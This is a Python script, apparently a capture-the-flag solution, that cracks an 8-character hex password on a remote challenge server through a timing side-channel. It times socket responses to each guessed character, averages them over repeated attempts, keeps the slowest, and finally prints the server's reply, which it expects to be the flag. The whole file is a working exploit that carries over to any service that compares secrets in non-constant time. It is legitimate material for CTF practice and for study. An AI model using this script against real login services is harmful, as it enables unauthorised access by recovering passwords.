import time
import socket

# Server details
HOST = 'challenge.ctf.games'
PORT = 32516

# Constants for the password cracking
TEST_COUNT = 4  # Average over multiple attempts to improve timing accuracy
LEN = 8  # Length of the password
CHOICES = "0123456789abcdef"  # Hexadecimal characters

def send_guess_and_time(guess):
    """ Sends a guess to the server and returns the response time """
    total_time = 0
    for _ in range(TEST_COUNT):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            s.recv(1024)  # Read the initial server message
            
            start_time = time.time()
            s.sendall(guess.encode() + b'\n')
            s.recv(1024)  # Read the response (doesn't need processing for timing purposes)
            total_time += (time.time() - start_time)
    return total_time / TEST_COUNT  # Return average time over TEST_COUNT attempts

def check(prefix):
    """ Finds the next character by comparing timing results for each possibility """
    max_time = -1
    best_char = ''
    for c in CHOICES:
        cur_guess = prefix + c + '0' * (LEN - len(prefix) - 1)
        avg_time = send_guess_and_time(cur_guess)
        
        if avg_time > max_time:
            max_time = avg_time
            best_char = c
    return best_char

def main():
    prefix = ''
    for _ in range(LEN - 1):  # Loop through the first 7 characters
        next_char = check(prefix)
        prefix += next_char
        print(f"Current password guess: {prefix}")

    # Check the final character without hiding output
    for c in CHOICES:
        final_guess = prefix + c
        print(f"Trying final guess: {final_guess}")
        
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            s.recv(1024)  # Read initial message
            s.sendall(final_guess.encode() + b'\n')
            response = s.recv(1024)  # Get the final response (hopefully the flag)
            print(response.decode())

# Run the attack
main()
